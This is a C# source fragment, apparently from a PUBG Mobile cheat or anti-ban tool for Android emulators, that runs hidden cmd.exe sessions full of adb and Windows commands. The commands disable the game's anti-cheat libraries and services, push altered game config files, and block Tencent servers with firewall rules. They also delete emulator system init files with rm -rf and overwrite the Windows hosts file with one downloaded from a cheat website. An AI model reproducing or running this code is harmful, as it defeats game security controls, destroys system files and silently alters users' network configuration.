                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 push C:\\Windows\\UserEngine.ini /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 push C:\\Windows\\UserGame.ini /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 push C:\\Windows\\UserLogSuppression.ini /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell sleep 5");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/stdin");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.pubg.krmobile-1/libUE4.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /storage/emulated/0/Android/data/com.tencent.tinput");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /init.vbox86.rc /init.vbox86.rc1");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /system/build.prop /system/build.prop1");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/Superuser.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/Settings.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/SystemUI.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/app/tinput.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/bin/androVM_setprop");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /init.superuser.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/lib/libbcinfo.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 444 /system/lib/hw/gralloc.vbox86.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /ueventd.vbox86.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/lib/libhardware.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /default.prop");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /fstab.vbox86");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/Settings/Settings.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/SettingsProvider/SettingsProvider.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/InputDevices/InputDevices.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app/SystemUI/SystemUI.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/priv-app");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /system/xbin/su");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /ueventd.titan.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /fstab.titan");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 000 /.libcache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell sleep 7");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.pubg.krmobile-1/libtersafe.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.pubg.krmobile-1/libgcloud.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 000 /data/app-lib/com.pubg.krmobile-1/libTDataMaster.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /mnt/shell/emulated/0/Notifications");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /data/data/com.pubg.krmobile/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 444 /data/data/com.pubg.krmobile/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 644 /data/data/com.pubg.krmobile/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 444 /data/data/com.pubg.krmobile/files/iMSDK");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 444 /data/data/com.pubg.krmobile/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 644 /data/data/com.pubg.krmobile/files/tss_tmp");
                standardInput.WriteLine("netsh advfirewall firewall add rule name=update1 interface=any dir=out action=block remoteip=203.205.0.0-203.205.255.255,123.151.0.0-123.151.255.255,58.250.0.0-58.250.255.255,113.105.0.0-113.105.255.255");
                standardInput.WriteLine("netsh advfirewall firewall add rule name=private protocol=TCP dir=out action=block enable=yes remoteport=15692,20371,23946,27042,27043,5403,5646,7312,7311,2384,2383,3013,18081,8085,8086,13003,10012,8081,8088,13004,5006,5012,5046,5045,8080,11042,11041,2979,2986,17000,13004,13003,35000,10013,10012,15692,20371");
                standardInput.Flush();
                standardInput.Close();
                process.WaitForExit();
                checkBox8.Checked = true;
                MainForm.cmd("taskkill /F /IM adb.exe");
            }
        }

        private void label2_Click(object sender, EventArgs e)
        {
            this.WindowState = FormWindowState.Minimized;
        }

        private void button2_Click(object sender, EventArgs e)
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();

            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                    standardInput.WriteLine("adb.exe kill-server");
                standardInput.WriteLine("adb.exe start-server");
                standardInput.WriteLine("adb connect 127.0.0.1:5555");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 root");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 remount");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /init.vbox86.r0 /init.vbox86.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /init.vbox86.rc1 /init.vbox86.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /system/build.prop1 /system/build.prop");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/priv-app/Superuser.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/priv-app/Settings.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/priv-app/SystemUI.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/app/tinput.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 755 /system/bin/androVM_setprop");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/priv-app/");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 755 /init.superuser.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /ueventd.vbox86.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/lib/libhardware.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 666 /system/lib/hw/gralloc.vbox86.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /default.prop");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /fstab.vbox86");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/priv-app/Settings/Settings.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/priv-app/SettingsProvider/SettingsProvider.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/priv-app/InputDevices/InputDevices.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/priv-app/SystemUI/SystemUI.apk");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /system/priv-app");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 755 /system/xbin/su");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /ueventd.titan.rc");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /fstab.titan");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod -R 644 /.libcache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /data/UserEngine.ini /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /data/UserGame.ini /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /data/UserLogSuppression.ini /storage/emulated/0/com.tencent.ig/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell am kill com.tencent.ig");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell am force-stop com.tencent.ig");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.tencent.ig-1");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.tencent.ig-1/libUE4.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.tencent.ig-1/libtersafe.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.tencent.ig-1/libgcloud.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.tencent.ig-1/libTDataMaster.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.tencent.ig/databases");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.tencent.ig/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.tencent.ig/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.tencent.ig/files/iMSDK");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.tencent.ig/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.tencent.ig/files/tss_tmp");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /data/UserEngine.ini /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /data/UserGame.ini /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /data/UserLogSuppression.ini /storage/emulated/0/com.vng.pubgmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell am kill com.vng.pubgmobile");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell am force-stop com.vng.pubgmobile");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.vng.pubgmobile-1");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.vng.pubgmobile-1/libUE4.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.vng.pubgmobile-1/libtersafe.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.vng.pubgmobile-1/libgcloud.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.vng.pubgmobile-1/libTDataMaster.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.vng.pubgmobile/databases");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.vng.pubgmobile/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.vng.pubgmobile/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.vng.pubgmobile/files/iMSDK");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.vng.pubgmobile/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.vng.pubgmobile/files/tss_tmp");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /data/UserEngine.ini /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserEngine.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /data/UserGame.ini /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserGame.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell mv /data/UserLogSuppression.ini /storage/emulated/0/com.pubg.krmobile/files/UE4Game/ShadowTrackerExtra/ShadowTrackerExtra/Config/UserLogSuppression.ini");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell am kill com.pubg.krmobile");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell am force-stop com.pubg.krmobile");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.pubg.krmobile-1");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.pubg.krmobile-1/libUE4.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.pubg.krmobile-1/libtersafe.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.pubg.krmobile-1/libgcloud.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/app-lib/com.pubg.krmobile-1/libTDataMaster.so");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell rm -rf /data/data/com.pubg.krmobile/databases");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.pubg.krmobile/app_bugly");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.pubg.krmobile/files");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.pubg.krmobile/files/iMSDK");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.pubg.krmobile/cache");
                standardInput.WriteLine("adb -s 127.0.0.1:5555 shell chmod 755 /data/data/com.pubg.krmobile/files/tss_tmp");
                standardInput.WriteLine("nbtstat -r");
                standardInput.WriteLine("nbtstat -rr");
                standardInput.WriteLine("sc stop aow_drv");
                standardInput.WriteLine("sc stop QMEmulatorService");
                standardInput.WriteLine("sc stop Tensafe");
                standardInput.WriteLine("adb shell sleep 5");
                standardInput.WriteLine("del /s /f /q C:\\aow_drv.log");
                standardInput.WriteLine("TaskKill /F /IM Androidemulator.exe");
                standardInput.Flush();
                standardInput.Close();
                process.WaitForExit();
            }
                Process processe = new Process();
                processe.StartInfo.FileName = "cmd.exe";
                processe.StartInfo.UseShellExecute = false;
                processe.StartInfo.RedirectStandardInput = true;
                processe.StartInfo.CreateNoWindow = true;
                processe.StartInfo.Verb = "runas";
                processe.Start();
                processe.StandardInput.WriteLine($@"netsh advfirewall reset");
                processe.StandardInput.Flush();
                processe.StandardInput.Close();
                processe.WaitForExit();
                processe.Close();
                using (WebClient webClient = new WebClient())
                {

                    webClient.DownloadFileAsync(new Uri("http://www.joycheat.com/wp-content/uploads/2020/10/hosts-1"), "C:\\Windows\\System32\\drivers\\etc\\hosts");
                }
                Environment.Exit(0);


            }

        private void checkBox2_CheckedChanged(object sender, EventArgs e)
        {
            Process process = new Process();
            process.StartInfo = new ProcessStartInfo()
            {
                FileName = "cmd.exe",
                CreateNoWindow = true,
                RedirectStandardInput = true,
                UseShellExecute = false
            };
            process.Start();

            using (StreamWriter standardInput = process.StandardInput)
            {
                if (standardInput.BaseStream.CanWrite)
                    standardInput.WriteLine("@echo off");
                standardInput.WriteLine("adb.exe kill-server");
                standardInput.WriteLine("adb.exe start-server");
                standardInput.WriteLine("adb.exe devices");
                standardInput.WriteLine("adb.exe shell rm -rf /fstab.vbox86");
                standardInput.WriteLine("adb.exe shell rm -rf /init");
                standardInput.WriteLine("adb.exe shell rm -rf /init.environ.rc");
                standardInput.WriteLine("adb.exe shell rm -rf /init.rc");
                standardInput.WriteLine("adb.exe shell rm -rf /init.superuser.rc");
                standardInput.WriteLine("adb.exe shell rm -rf /init.trace.rc");
                standardInput.WriteLine("adb.exe shell rm -rf /init.usb.rc");
                standardInput.WriteLine("adb.exe shell rm -rf /init.vbox86.rc");
                standardInput.WriteLine("adb.exe shell rm -rf /stderr");
                standardInput.WriteLine("adb.exe shell rm -rf /stdin");
                standardInput.WriteLine("adb.exe shell rm -rf /stdout");
                standardInput.WriteLine("adb.exe shell rm -rf /ueventd.rc");
                standardInput.WriteLine("adb.exe shell rm -rf /ueventd.vbox86.rc");
                standardInput.WriteLine("adb.exe kill-server");
                standardInput.Flush();
                standardInput.Close();
                process.WaitForExit();
            }
        }
    }
}